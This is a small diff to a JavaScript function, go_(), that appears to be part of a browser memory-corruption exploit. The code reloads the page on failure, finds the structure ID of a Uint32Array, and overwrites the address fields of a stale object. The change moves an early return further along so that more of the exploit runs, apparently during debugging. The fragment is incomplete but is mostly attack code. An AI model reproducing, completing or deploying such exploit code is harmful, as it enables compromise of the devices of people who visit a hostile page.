@@ -156,7 +156,6 @@ function go_() {
 		//alert("Exploit Failed");
 		document.location.reload();
 	}
-	return;
 	
 	stale[0] += 0x101;
 
@@ -225,6 +224,8 @@ function go_() {
 				}
 				alert('found structID for Uint32Array = ' + structID);
 				alert('stale[0] is now: ' + stale[0]);
+				
+				return;
 
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
